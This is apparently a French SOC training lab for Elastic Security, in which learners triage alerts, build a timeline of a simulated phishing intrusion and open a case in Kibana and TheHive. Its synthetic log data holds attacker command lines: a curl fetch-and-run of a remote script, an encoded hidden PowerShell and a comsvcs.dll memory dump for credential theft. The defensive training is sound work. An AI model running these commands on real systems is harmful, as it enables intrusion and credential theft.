# TP 6 — Alertes, Timeline et Cases

> Trier les alertes, reconstituer l'intrusion de `ws-02` dans une timeline, et ouvrir un case qui rassemble les preuves.

**Topic** : Security App — Alerts, Timeline, Cases

## Contexte

Les règles du TP 5 ont levé des alertes. L'analyste de garde, c'est vous : vrai ou faux positif ? jusqu'où ? que faire ?

## Setup

Ce TP est autonome. Il utilise le **jeu de données du lab** : 25 événements ECS, dans le data stream `logs-lab-default`. Le pipeline `lab-replay` décale leurs dates, pour que le dernier ait eu lieu il y a 10 minutes — réglez le sélecteur de temps de Kibana sur **Last 4 hours**.

Envoyez ce bloc dans **Dev Tools** (le `DELETE` vide un éventuel chargement précédent) :

```json
DELETE /_data_stream/logs-lab-default

PUT /_ingest/pipeline/lab-replay
{
  "description": "Rejoue le jeu de données du lab : décale les événements pour que le dernier ait eu lieu il y a 10 minutes",
  "processors": [
    {
      "script": {
        "source": "ZonedDateTime ts = ZonedDateTime.parse(ctx['@timestamp']); long ms = ChronoUnit.MILLIS.between(ts, ZonedDateTime.parse(params.end)); ctx['@timestamp'] = metadata().now.minus(ms, ChronoUnit.MILLIS).toString();",
        "params": { "end": "2026-10-01T10:30:00Z" }
      }
    }
  ]
}

POST /logs-lab-default/_bulk?pipeline=lab-replay&refresh
{"create":{}}
{"@timestamp":"2026-10-01T07:55:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"deploy"},"source":{"ip":"10.0.0.12"},"message":"Accepted publickey for deploy from 10.0.0.12 port 40022 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52311 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52321 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:20Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52331 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:30Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52341 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:40Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52351 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:01:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Accepted password for admin from 203.0.113.50 port 52400 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"curl","command_line":"curl -s http://198.51.100.7/x.sh -o /tmp/x.sh","pid":4101,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"bash","command_line":"bash /tmp/x.sh","pid":4102,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:03:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"crontab","command_line":"crontab -l","pid":4110,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T09:58:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"winword.exe","command_line":"\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n invoice.docm","pid":7001,"parent":{"name":"explorer.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgA","pid":7300,"parent":{"name":"winword.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:05Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"updater.exe","command_line":"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe","pid":7312,"parent":{"name":"powershell.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:01:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:02:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:04:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:05:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:06:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"chrome.exe","pid":5120},"source":{"ip":"10.0.0.42","bytes":2048},"destination":{"ip":"142.250.74.110","port":443,"bytes":88000},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"whoami.exe","command_line":"whoami /all","pid":7350,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"net.exe","command_line":"net group \"Domain Admins\" /domain","pid":7351,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:15:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":4096},"destination":{"ip":"10.0.0.20","port":445,"bytes":1024},"network":{"transport":"tcp","direction":"internal"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:16:00Z","host":{"name":"db-01","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"svc_backup"},"process":{"name":"rundll32.exe","command_line":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full","pid":8800,"parent":{"name":"services.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:20:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":48000000},"destination":{"ip":"198.51.100.7","port":443,"bytes":2048},"network":{"transport":"tcp","direction":"egress"}}
```

Résultat attendu (extrait) :

```json
{ "errors": false }
```

Ce TP part des **règles du TP 5** : si vous ne les avez pas, créez au moins `Encoded PowerShell command` et `Large upload to one destination` (TP 5, exercices 4 et 7), avec un look-back de 4 heures, et attendez leurs alertes.

## Exercice 1 — Trier

1. **Alerts**, **Group by** *Host name* : quel hôte concentre les alertes les plus graves ?
2. Ouvrez l'alerte `Encoded PowerShell command`. Onglet **Overview** : lisez la *reason*.
3. Onglet **Insights** → **Prevalence** : `198.51.100.7` est-elle vue sur un ou plusieurs hôtes ?
4. Passez l'alerte en **Acknowledged**, assignez-la-vous.

<details>
<summary>Réponse</summary>

`ws-02`. L'IP `198.51.100.7` est vue sur **deux** hôtes : `ws-02` (C2) et `web-01` (téléchargement du script) — un indice qu'il s'agit d'une seule campagne.

</details>

## Exercice 2 — L'analyzer

Sur l'alerte PowerShell, **Visualize** → **Analyzer** : l'arbre des processus. Retrouvez `winword.exe` → `powershell.exe` → `updater.exe`.

> L'analyzer s'appuie sur `process.entity_id` (Elastic Defend). Sur le jeu du lab, qui n'en a pas, il peut rester vide : la timeline de l'exercice suivant raconte la même histoire.

## Exercice 3 — Une timeline

1. Sur l'alerte : **Investigate in timeline**.
2. Remplacez la requête par `host.name: ws-02`, triez par `@timestamp` **croissant**.
3. Ajoutez les colonnes `process.parent.name`, `process.name`, `process.command_line`, `destination.ip`, `source.bytes`.
4. **Épinglez** (📌) les événements qui racontent l'intrusion, et ajoutez une **note** à chacun.
5. Titre : `Intrusion ws-02`. **Save**.

Le même déroulé, en ES|QL :

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE host.name == "ws-02" AND event.category == "process"
    | SORT @timestamp ASC
    | KEEP process.parent.name, process.name
  """
}
```

Résultat attendu :

```json
{
  "values": [
    ["explorer.exe", "winword.exe"],
    ["winword.exe", "powershell.exe"],
    ["powershell.exe", "updater.exe"],
    ["updater.exe", "whoami.exe"],
    ["updater.exe", "net.exe"]
  ]
}
```

**Question** : quelles sont les étapes, et leurs tactiques MITRE ATT&CK ?

<details>
<summary>Réponse</summary>

| Heure (jeu d'origine) | Événement | Tactique |
|-----------------------|-----------|----------|
| 09:58 | `winword.exe` ouvre `invoice.docm` | Initial Access (phishing) |
| 10:00 | `powershell.exe -enc` lancé par Word | Execution |
| 10:00 | `updater.exe` depuis `%TEMP%` | Persistence / C2 |
| 10:01 → 10:06 | une connexion par minute vers `198.51.100.7:443` | Command and Control |
| 10:12 | `whoami /all`, `net group "Domain Admins"` | Discovery |
| 10:15 | SMB (445) vers `10.0.0.20` | Lateral Movement |
| 10:20 | 48 Mo vers `198.51.100.7` | Exfiltration |

</details>

## Exercice 4 — L'onglet Correlation

Dans la timeline, onglet **Correlation**, requête EQL :

```text
sequence by host.name with maxspan=10m
  [process where process.parent.name == "winword.exe"]
  [network where destination.ip == "198.51.100.7"]
```

Vérifiez dans Dev Tools :

```json
POST /logs-lab-default/_eql/search?filter_path=hits.total
{
  "query": """
    sequence by host.name with maxspan=10m
      [process where process.parent.name == "winword.exe"]
      [network where destination.ip == "198.51.100.7"]
  """
}
```

Résultat attendu :

```json
{ "hits": { "total": { "value": 1 } } }
```

## Exercice 5 — Un case

1. Sur l'alerte PowerShell : **Add to case** → **Create new case**.
2. Titre `Intrusion ws-02 — phishing, C2 et exfiltration`, severity **High**, tags `phishing`, `exfiltration`.
3. Dans le case : **Add** la timeline `Intrusion ws-02`, et l'alerte `Large upload to one destination`.
4. Ajoutez la visualisation *Top talkers* du TP 4 en commentaire (**Visualization**).
5. Commentaire : un résumé en trois lignes, et les actions de réponse proposées.
6. Statut : **In progress**.

## Exercice 6 — Fermer la boucle

1. Les alertes rattachées au case : passez-les en **Closed** — motif *True positive*.
2. Dans le case, ajoutez une **observable** : l'IP `198.51.100.7`.
3. **Question** : quelle règle aurait détecté cette intrusion **plus tôt** ?

<details>
<summary>Réponse</summary>

Une règle sur le **beacon** (Command and Control), dès 10:05 — au lieu de 10:20 pour l'exfiltration. Ou une règle *New terms* sur `destination.ip` par `host.name`. Le TP 7 l'écrit.

</details>

## Exercice 7 (optionnel) — Pousser le case vers TheHive

Le SOC suit ses incidents dans un outil dédié — Jira, ServiceNow, TheHive. Un **connector** pousse le case Kibana vers cet outil. Ici, [TheHive](https://docs.strangebee.com/thehive/), en local, à côté du lab. Il demande environ **1,5 Go de RAM** en plus.

1. Démarrez TheHive, une fois la stack du lab lancée — le dossier `thehive/` du TP :

   ```bash
   cd thehive
   docker compose up -d --wait
   ```

   Si le port `9000` est déjà pris sur votre machine : `THEHIVE_PORT=9010 docker compose up -d --wait`, et remplacez `9000` par `9010` dans les URL du **navigateur** et des `curl` ci-dessous (Kibana, lui, appelle toujours `http://thehive:9000`).

2. Préparez TheHive : une organisation `soc`, un analyste pour vous, et un compte de service pour Kibana, avec sa clé d'API. Le compte `admin@thehive.local` / `secret` ne gère que les organisations et les comptes :

   ```bash
   H=http://localhost:9000; A=admin@thehive.local:secret
   curl -s -u $A -H 'Content-Type: application/json' $H/api/v1/organisation \
     -d '{"name":"soc","description":"Le SOC du lab"}'
   curl -s -u $A -H 'Content-Type: application/json' $H/api/v1/user \
     -d '{"login":"analyst@soc.local","name":"Analyste","profile":"analyst","organisation":"soc","password":"changeme"}'
   curl -s -u $A -H 'Content-Type: application/json' $H/api/v1/user \
     -d '{"login":"kibana@soc.local","name":"Kibana","profile":"analyst","organisation":"soc","type":"Service"}'
   curl -s -u $A -X POST $H/api/v1/user/kibana@soc.local/key/renew   # affiche la clé d'API
   ```

3. Dans Kibana, **Stack Management → Connectors → Create connector → TheHive** :
   - nom `TheHive du lab` ;
   - URL `http://thehive:9000` — le nom du conteneur sur le réseau du lab, pas `localhost` ;
   - Organisation `soc` ; API key : la clé de l'étape 2.

4. Dans le case de l'exercice 5, panneau de droite, **External incident management system** : choisissez `TheHive du lab`, TLP **AMBER**. Puis **Push as TheHive incident**.
5. Connectez-vous à TheHive, `http://localhost:9000`, en `analyst@soc.local` / `changeme` : le case y est.
6. Dans Kibana, ajoutez un commentaire au case, puis **Update TheHive incident**. Le commentaire apparaît dans TheHive.

**Question** : la severity *High* de Kibana, que devient-elle dans TheHive ? Et dans quel sens va la synchronisation ?

<details>
<summary>Réponse</summary>

*High* devient la severity **3** de TheHive (1 *Low* → 4 *Critical*) ; titre, description, tags et commentaires suivent. La synchronisation va **dans un seul sens**, de Kibana vers TheHive, et seulement au **push** : ce qui change dans TheHive ne revient pas dans Kibana, et un commentaire Kibana n'arrive qu'au push suivant.

</details>

Pour arrêter TheHive : `docker compose down -v`, dans `thehive/`.

## Critères de succès

- [ ] Les alertes sont triées : *Acknowledged*, puis *Closed* avec un motif
- [ ] La timeline `Intrusion ws-02` contient les événements épinglés et leurs notes
- [ ] Le case rassemble alertes, timeline, visualisation et observable
- [ ] Vous savez nommer chaque étape de l'intrusion et sa tactique
- [ ] *(optionnel)* Le case est dans TheHive, avec son dernier commentaire

## Dépannage

| Symptôme | Cause probable | Solution |
|----------|----------------|----------|
| Pas d'alertes | Règles du TP 5 absentes ou look-back trop court | Voir le setup |
| La timeline est vide | Index de la timeline | Data view **Security** ; `logs-lab-*` dans `securitySolution:defaultIndex` |
| *Add to case* grisé | Droits | Le rôle doit avoir *Cases: All* |
| `network elastic-security-lab_default not found` | TheHive lancé avant le lab | `docker compose up -d --wait` dans `lab/`, puis dans `thehive/` |
| Le push échoue : `ECONNREFUSED` ou `ENOTFOUND` | URL du connector | `http://thehive:9000`, pas `localhost` : c'est Kibana qui appelle |
| Le push échoue : `401` | Clé d'API | Régénérez-la (`key/renew`) et collez-la dans le connector |

## Pour aller plus loin

- **Timeline templates** : un template `host.name: {host.name}`, attaché à la règle PowerShell.
- **Connectors** : le même push vers Jira ou ServiceNow — un compte Jira Cloud gratuit, ou une *Personal Developer Instance* ServiceNow.
